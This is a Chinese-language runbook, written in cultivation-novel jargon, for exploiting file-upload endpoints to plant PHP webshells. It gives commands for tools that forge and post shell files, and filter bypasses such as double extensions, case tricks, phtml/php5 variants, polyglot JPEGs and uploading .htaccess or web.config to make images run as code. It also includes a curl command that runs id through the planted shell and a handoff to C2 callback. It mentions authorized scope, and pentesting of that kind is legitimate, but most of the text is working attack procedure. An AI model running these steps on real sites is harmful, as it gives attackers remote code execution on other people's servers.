# 大爱仙尊文件上传作业手法

> 杀招：`寄生蛊`  
> 锻造：`python3 炼蛊房/upload_forge_probe.py kit --case <案>`  
> 马本体：`payload_forge.py make --kind php-cmd`  
> 专卡：Laravel 双扩展走 `花架·寄生.md`

目标须在 scope。覆盖真用户文件先问。

---

## 1. 立刻跑

```bash
python3 炼蛊房/upload_forge_probe.py --self-test
python3 炼蛊房/upload_forge_probe.py kit --case <案>
python3 炼蛊房/core_web_surface_probe.py --base https://授权站 --case <案>
# 找到上传 URL 后
python3 炼蛊房/upload_forge_probe.py post --url https://授权站/upload \
  --file 案卷/<案>/案卷/upload/se_tiny.php --case <案>
```

产物：`案卷/upload/`（双扩展、大小写、JPEG 头、`.htaccess`、`web.config` + HOW_TO）。

---

## 2. 四刀

1. **找点** — 头像 / 附件 / 编辑器 / 导入 / 分片 / OSS 直传  
2. **出包** — 先 `upload_forge_probe kit`，不要手写第三套马  
3. **过闸** — 拦 `.php` 就 `php.jpg` / `PhP` / `phtml` / `php5`；图床二次渲染用 `se_poly.jpg`  
4. **执行** — `curl -H 'X-SE: 口令' -d c=id` 能回命令输出才算 L3。只 200 上传成功不算 RCE

Apache 黑名单：先传 `.htaccess`（把 jpg 当 PHP），再传 `se_tiny.php.jpg`。  
IIS：`web.config` **只传到上传目录**，禁止盖站点根（会拆站）。  
Zip Slip / 远程 URL 抓取：上传卡并联 `ssrf-testing`。

---

## 3. 档位

| 档 | 成立 |
|----|------|
| L1 | 上传接口吃文件，返回路径 |
| L2 | 变体落盘可访问 |
| L3 | `X-SE` 口令下 `id`/`whoami` 回显 |

L3 后交接 `payload_forge` 回连或 `host-c2-verify`。
